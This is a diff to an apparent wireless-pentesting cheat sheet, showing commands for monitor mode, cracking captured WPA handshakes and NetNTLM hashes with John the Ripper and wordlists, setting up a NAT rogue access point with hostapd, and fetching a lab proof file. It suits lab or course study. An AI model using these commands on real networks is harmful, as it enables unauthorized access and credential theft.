@@ -13,9 +13,7 @@ sudo airmon-ng stop wlan0
 iw wlan0 info
 iwconfig
 ifconfig
-
 ```
-
 ## Airodump-ng 
 ### WEP, WPA/WPA2
 #### Don't forget to specify interface
@@ -75,6 +73,7 @@ sudo nano /etc/john/john.conf
 john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
 john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap
 
+grep JTR | cut -f2 >> [output.txt]
 john --format=netntlm [timothy.txt] --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 ### Hashcat
@@ -178,4 +177,8 @@ sudo nft add table nat
 sudo nft 'add chain nat postrouting { type nat hook postrouting priority 100 ; }'
 sudo nft add rule ip nat postrouting oifname "eth0" ip daddr != 10.0.0.1/24 masquerade
 sudo hostapd hostapd.conf
-
+```
+## Proof.txt
+```
+curl http://192.168.1.1/proof.txt
+```
